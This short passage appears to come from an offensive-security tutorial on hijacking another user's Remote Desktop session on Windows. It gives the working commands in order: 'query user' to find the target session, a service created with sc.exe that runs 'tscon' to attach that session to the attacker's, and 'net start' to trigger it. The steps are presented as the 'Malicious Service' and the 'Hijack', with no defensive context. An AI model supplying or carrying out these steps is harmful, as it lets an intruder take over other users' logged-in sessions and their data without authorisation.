
 ```ruby
query user
 ``` 

**What to look for in the output:**

- **Target's Session ID:** Find the user you want to impersonate (e.g., `lewen`) and note their ID (e.g., `2`).

- **Your Session Name:** Find your current username and note the Session Name (e.g., `rdp-tcp#13`).

### Create the Malicious Service

```ruby
sc.exe create [Service_Name] binpath= "cmd.exe /k tscon [Target_ID] /dest:[Your_Session_Name]"
```

### Execute the Hijack

```ruby
net start sessionhijack
```

